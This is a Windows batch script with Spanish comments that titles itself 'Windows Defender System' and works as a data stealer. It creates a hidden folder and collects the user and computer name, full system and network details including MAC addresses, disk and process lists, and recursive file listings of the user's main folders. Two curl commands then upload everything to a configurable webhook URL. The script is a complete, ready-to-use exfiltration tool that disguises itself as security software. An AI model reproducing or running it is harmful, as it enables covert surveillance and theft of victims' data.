:: READ THE README.txt FILE BEFORE USING THIS SCRIPT. IT CONTAINS IMPORTANT INFORMATION ABOUT THE SCRIPT'S FUNCTIONALITY AND POTENTIAL RISKS.
@echo off
title Windows Defender System
color 0a

:: Reemplace the variable "YOUR_WEBHOOK_URL_GOES_HERE" with the actual webhook URL you want to use for sending the data.
set "WEBHOOK=YOUR_WEBHOOK_URL_GOES_HERE"

set "LOGDIR=%TEMP%\SystemLogs"
mkdir "%LOGDIR%" >nul 2>&1

if exist "%LOGDIR%" (
    attrib +h "%LOGDIR%" >nul 2>&1
    echo Carpeta creada en %LOGDIR%
) else (
    set "LOGDIR=%USERPROFILE%\Documents\SystemLogs"
    mkdir "%LOGDIR%" >nul 2>&1
    echo Se ha usado la carpeta alternativa en Documentos.
)

set "DATA=%LOGDIR%\data-not.txt"

echo Usuario: %USERNAME% >> "%DATA%"
echo Ordenador: %COMPUTERNAME% >> "%DATA%"
echo Fecha: %date% >> "%DATA%"
echo Hora: %time% >> "%DATA%"
echo. >> "%DATA%"
echo Información del sistema >> "%DATA%"
systeminfo >> "%DATA%"
echo. >> "%DATA%"
echo Red y dirección MAC >> "%DATA%"
ipconfig /all >> "%DATA%"
echo. >> "%DATA%"
echo. >> "%DATA%"
echo Conectividad >> "%DATA%"
ping -n 4 1.1.1.1 >> "%DATA%"
echo Almacenamiento >> "%DATA%"
powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID,Size,FreeSpace | Format-Table -AutoSize" >> "%DATA%"

set "USUARIO=%USERNAME%"
set "CARPETA=C:\Users\%USUARIO%"
set "LOG=%USERPROFILE%\Documents\lista_archivos.txt"

echo Carpeta de Descargas > "%LOG%"
dir "%USERPROFILE%\Downloads" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Imágenes >> "%LOG%"
dir "%USERPROFILE%\Pictures" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Videos >> "%LOG%"
dir "%USERPROFILE%\Videos" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Documentos >> "%LOG%"
dir "%USERPROFILE%\Documents" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Escritorio >> "%LOG%"
dir "%USERPROFILE%\Desktop" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta completa del usuario >> "%LOG%"
dir "%CARPETA%" /a-d /b /s >> "%LOG%" 2>nul

tasklist >> "%DATA%"

curl -s -F "content=Equipo: %COMPUTERNAME% | Usuario: %USERNAME% | %date% %time%" -F "file=@\"%DATA%\"" "%WEBHOOK%"
curl -s -F "file=@\"%LOG%\"" "%WEBHOOK%"
